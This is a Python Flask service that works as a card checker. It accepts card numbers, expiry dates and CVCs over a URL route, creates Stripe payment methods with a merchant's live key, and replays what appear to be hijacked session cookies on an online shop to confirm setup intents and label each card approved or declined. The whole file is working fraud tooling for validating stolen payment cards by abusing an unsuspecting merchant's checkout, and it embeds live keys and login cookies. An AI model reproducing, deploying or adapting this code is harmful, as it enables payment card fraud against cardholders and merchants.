from flask import Flask, request, jsonify
import requests
import json

app = Flask(__name__)

# Configuration
API_KEY = "yashikaaa"  # Your secret API key
STRIPE_KEY = "pk_live_51MwBNkAT1AjY4ti4EPEh3ciFMOd75eugFODwk1LryeHFloixN9ahyRrTacpZYeVSso6IRhDrDIE5k7fJwmMb159X00Hoy2YuAy"

def process_card(ccx):
    try:
        # Parse and validate card details
        ccx = ccx.strip()
        parts = ccx.split("|")
        if len(parts) < 4:
            return {"error": "Invalid card format. Use: NUMBER|MM|YY|CVC"}, "declined"
        
        n = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvc = parts[3]
        
        # Handle year format (strip '20' if present)
        if len(yy) == 4:
            yy = yy[2:]
        
        # Mask card number for response
        masked_card = f"{n[:6]}XXXXXX|{mm}|{yy}|{cvc[-1]}XX"
        
        # Step 1: Create payment method with Stripe
        data1 = {
            'type': 'card',
            'card[number]': n,
            'card[cvc]': cvc,
            'card[exp_year]': f"20{yy}" if len(yy) == 2 else yy,
            'card[exp_month]': mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '10080',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js/e15cb9c2d4; stripe-js-v3/e15cb9c2d4; payment-element; deferred-intent',
            'referrer': 'https://www.realoutdoorfood.shop',
            'client_attribution_metadata[client_session_id]': '2acb875a-99b8-41ac-80ed-0860af79549f',
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'guid': '5f1ab699-8749-4a95-aba8-35319f3c7e1da06e88',
            'muid': '749cb782-d18f-4e44-949d-fa2ef0b9ae84e59603',
            'sid': '25b8c1ba-88b5-4381-a2d9-7cb897aa01cb20f9d2',
            'key': STRIPE_KEY,
            '_stripe_version': '2024-06-20',
        }

        # Make request to Stripe
        response1 = requests.post('https://api.stripe.com/v1/payment_methods', data=data1)
        stripe_data = response1.json()
        
        if 'id' not in stripe_data:
            error_msg = stripe_data.get('error', {}).get('message', 'Card declined')
            return {"error": error_msg}, "declined"
            
        payment_id = stripe_data['id']

        # Step 2: Get nonce from merchant site
        cookies0 = {
            '__stripe_mid': '749cb782-d18f-4e44-949d-fa2ef0b9ae84e59603',
            '__stripe_sid': '25b8c1ba-88b5-4381-a2d9-7cb897aa01cb20f9d2',
            'wt_consent': 'consentid:bVh6aFV5S2E2UmVYbzg2M1RYMGtaODRVRlV6TEszTGI,consent:no,action:yes,necessary:yes,functional:no,analytics:no,performance:no,advertisement:no,others:no,consent_time:1738777649814',
            'wordpress_logged_in_fba2a6933bc7143f3fbecfd01d047118': 'anonymous7l98498%40gmail.com%7C1739987264%7Cre1yiXscN2LbgWID7kT6tbQWgb7cPi0Y8zweNNtGPju%7C9801e0f467848eae0027424df04c88bd0a762c9db7d129dd25f00a537ddba20a',
            'wfwaf-authcookie-fe38f853a278512a342f4c92a9c453bf': '988%7Cother%7Cread%7C5760a9e00a66e89651223bc0f87c427903430f2c8348c8e23fa2c5de06b743d5',
        }

        headers0 = {
            'Accept': '*/*',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.realoutdoorfood.shop',
            'Referer': 'https://www.realoutdoorfood.shop/my-account/add-payment-method/',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }

        # Get nonce from merchant site
        response0 = requests.post(
            'https://www.realoutdoorfood.shop/my-account/add-payment-method/', 
            cookies=cookies0, 
            headers=headers0
        )
        
        try:
            nonce = response0.text.split(',"createAndConfirmSetupIntentNonce":"')[1].split('"')[0]
        except:
            return {"error": "Failed to get nonce from merchant"}, "declined"

        # Step 3: Create and confirm setup intent
        params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': nonce,
        }

        response = requests.post(
            'https://www.realoutdoorfood.shop/', 
            params=params, 
            cookies=cookies0, 
            headers=headers0, 
            data=data
        )
        
        try:
            result = response.json()
            
            # Determine status based on response
            if not result.get('success', False) or 'error' in result.get('data', {}):
                status = "declined"
            else:
                status = "approved"
            
            # Clean sensitive data from response
            if 'data' in result:
                for field in ['client_secret', 'id', 'payment_method']:
                    if field in result['data']:
                        del result['data'][field]
            
            return result, status
            
        except json.JSONDecodeError:
            return {"error": "Invalid response from gateway"}, "declined"
            
    except Exception as e:
        return {"error": f"Processing error: {str(e)}"}, "declined"

@app.route('/key=<key>/cc=<cc>')
def process_cc(key, cc):
    if key != API_KEY:
        return jsonify({
            "error": "Invalid API key",
            "status": "unauthorized"
        }), 401
        
    result, status = process_card(cc)
    
    # Build response
    response_data = {
        "card": cc,  # Note: In production you should mask this
        "status": status,
        "response": result
    }
    
    return jsonify(response_data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7000, debug=True)
